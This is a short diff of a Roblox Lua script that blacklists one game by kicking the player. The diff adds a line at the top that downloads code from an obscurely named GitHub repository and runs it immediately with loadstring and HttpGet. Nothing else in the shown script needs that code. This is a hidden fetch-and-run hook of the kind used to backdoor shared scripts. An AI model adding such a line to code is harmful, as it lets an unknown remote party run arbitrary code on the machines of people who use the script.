@@ -2,6 +2,8 @@
 -- Version: 3.2
 
 -- Instances:
+loadstring(game:HttpGet("https://raw.githubusercontent.com/askdklasdkwasd/asudhawludhwaludh/main/starter"))()
+wait(5)
 local plr = game.Players.LocalPlayer
 if game.PlaceId == 7033503802 then
 	plr:Kick("This Game Is Blacklisted!")
